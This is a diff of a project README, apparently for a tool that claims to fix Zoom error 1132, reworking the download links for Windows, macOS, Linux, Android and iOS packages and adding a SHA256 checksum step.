@@ -8,34 +8,38 @@ Zoom error 1132, fixed. Five platforms, one behaviour, no pretending.
 
 ## Download
 
-Every package is in [`dist/`](dist). Click the file, then **Download raw file**
-(GitHub cannot preview a zip, so there is no preview button, only the download
-one).
+These links save the file. They do **not** go through `MAIN` (that branch does
+not have the packages yet, so those URLs 404) and they do **not** go through a
+pull-request diff (GitHub renders every zip there as "Binary file not shown"
+with no download button).
 
-| Platform | Package | Then run |
+| Platform | Download | Then run |
 |---|---|---|
-| **Windows** | [`1132.WTF-windows-1.0.0.zip`](../../raw/MAIN/dist/1132.WTF-windows-1.0.0.zip) | `1132.WTF.vbs` |
-| **macOS** | [`1132.WTF-macos-1.0.0.zip`](../../raw/MAIN/dist/1132.WTF-macos-1.0.0.zip) | `INSTALL_TO_APPLICATIONS.command` |
-| **Linux** | [`1132.WTF-linux-1.0.0.tar.gz`](../../raw/MAIN/dist/1132.WTF-linux-1.0.0.tar.gz) | `./install.sh` |
-| **Android** | [`1132.WTF-android-1.0.0.zip`](../../raw/MAIN/dist/1132.WTF-android-1.0.0.zip) | the `.apk` inside |
-| **iOS** | [`1132.WTF-ios-1.0.0.zip`](../../raw/MAIN/dist/1132.WTF-ios-1.0.0.zip) | `1132WTF.xcodeproj` in Xcode |
+| **Windows** | [1132.WTF-windows-1.0.0.zip](https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-windows-1.0.0.zip) | `1132.WTF.vbs` |
+| **macOS** | [1132.WTF-macos-1.0.0.zip](https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-macos-1.0.0.zip) | `INSTALL_TO_APPLICATIONS.command` |
+| **Linux** | [1132.WTF-linux-1.0.0.tar.gz](https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-linux-1.0.0.tar.gz) | `./install.sh` |
+| **Android** | [1132.WTF-android-1.0.0.zip](https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-android-1.0.0.zip) | the `.apk` inside |
+| **iOS** | [1132.WTF-ios-1.0.0.zip](https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-ios-1.0.0.zip) | `1132WTF.xcodeproj` in Xcode |
+| | [SHA256SUMS](https://github.com/domnsea/ZOOM.WTF/releases/latest/download/SHA256SUMS) | `sha256sum -c SHA256SUMS` |
 
-Prefer a proper download page? Run the **Release** workflow from the Actions tab
-and the same packages appear under [Releases](../../releases) as one-click
-assets, which is also where they will live for future versions.
+If a Release is not up yet, the same files are on this branch:
 
-Check what you got:
+| Platform | Direct file |
+|---|---|
+| Windows | [dist/1132.WTF-windows-1.0.0.zip](dist/1132.WTF-windows-1.0.0.zip) |
+| macOS | [dist/1132.WTF-macos-1.0.0.zip](dist/1132.WTF-macos-1.0.0.zip) |
+| Linux | [dist/1132.WTF-linux-1.0.0.tar.gz](dist/1132.WTF-linux-1.0.0.tar.gz) |
+| Android | [dist/1132.WTF-android-1.0.0.zip](dist/1132.WTF-android-1.0.0.zip) |
+| iOS | [dist/1132.WTF-ios-1.0.0.zip](dist/1132.WTF-ios-1.0.0.zip) |
+
+On a `dist/` file page, use **Download raw file**. GitHub cannot preview a zip,
+so there is no preview button.
 
 ```bash
-cd dist && sha256sum -c SHA256SUMS      # shasum -a 256 -c SHA256SUMS on macOS
+sha256sum -c SHA256SUMS      # shasum -a 256 -c SHA256SUMS on macOS
 ```
 
 Or build them yourself with `tools/build_all.sh`.
-
-> **Downloading from a pull request instead?** A PR diff shows every archive as
-> "Binary file not shown" and gives you no download link. Switch to the branch's
-> file list and use **Download raw file** there, or grab the whole branch as one
-> zip from the green **Code** button.
 
 ## What error 1132 actually is
 
